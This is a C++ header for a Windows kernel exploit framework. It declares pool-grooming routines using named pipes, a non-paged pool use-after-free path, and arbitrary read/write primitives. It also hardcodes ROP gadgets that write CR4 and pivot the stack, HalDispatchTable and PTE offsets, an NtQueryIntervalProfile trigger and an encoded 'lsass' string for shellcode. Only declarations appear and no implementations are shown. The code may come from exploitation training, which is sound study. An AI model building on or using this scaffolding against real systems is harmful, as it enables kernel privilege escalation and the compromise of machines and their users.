#pragma once
#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <Psapi.h>
#include <vector>
#include <functional>
#include <vector>
#include <optional>
#include "Leaker.h"
#include "ROP.h"

#define DEFRAGMENT_CHUNK_AMOUNT 20000
#define SPRAYING_CHUNK_AMOUNT 60000

namespace aek {
	typedef struct PipeHandles {
		HANDLE read;
		HANDLE write;
	} PipeHandles, *PPipeHandles;

	class Exploiter {
	private:
		typedef enum SystemString : UINT64 {
			lsass = 0x78652e737361736c,
			proc = 0x636f7250
		} SystemString;

		typedef enum StaticAddress : UINT64 {
			kUser_shared_data = 0xFFFFF78000000800,
			fake_stack_0x48000000 = 0x48000000
		} StaticStructures;

		typedef enum Offset {
			off_MiGetPteAddress = 0x57738 + 0x13,
			off_HalDispatchTable = 0x426790 + 0x8
		} Offset;

		typedef enum Gadgets : UINT64 {
			pop_rcx = 0x140677f39,
			mov_cr4_rcx = 0x1409a4349,
			stack_pivot_0x48000000 = 0x1402d5880,	//// mov esp, 0x48000000; add esp, 0x28; ret; 
		} Gadgets;

		typedef enum Integers {
			pipe_header_size = 0x28
		} Integers;

		typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT PULONG Interval);
		
		UINT64 krnl_base = 0, pte_base = 0;
		//Leaker lk;
		Leaker& lk;
		
		PVOID shellcode = nullptr;

		BOOL Success(const char description[]);
		BOOL Error(const char description[]);

		// UAF
		std::vector<PipeHandles> groomed_chunks;
		size_t chunk_size = 0;

	public:
		Exploiter(Leaker& lk) : lk(lk) {};
		BOOL Exploit();
		BOOL ExploitARAW();
		BOOL ExploitNonpagedPoolUaF();

		// UAF
		VOID SetChunkSize(size_t chunk_size);
		BOOL CreateNPipes(size_t amount);
		BOOL CloseNPipes();
		BOOL DefragmentPool();
		BOOL SprayPool();
		BOOL MakePoolHoles();
		BOOL FillPoolHoles();
		BOOL PrepareROP(PVOID stack_address);

		// Common
		BOOL PrepareShellcode();

		// exploit_ARAW
		std::function<BOOL(PVOID, UINT64)> ArbitraryWriteRoutine;	//(PVOID dest_krnl_addr, UINT64 data_usr_8)
		std::function<UINT64(PVOID)> ArbitraryReadRoutine;	//(PVOID src_krnl_addr) => UINT64 krnl_value

		// exploit_NonpagedPool_UAF
		std::function<BOOL()> AllocateTriggerPool;
		std::function<BOOL(UINT64)> AllocateFakePool;
		std::function<BOOL()> FreeTriggerPool;
		std::function<BOOL()> TriggerCallbackFunction;
	};
}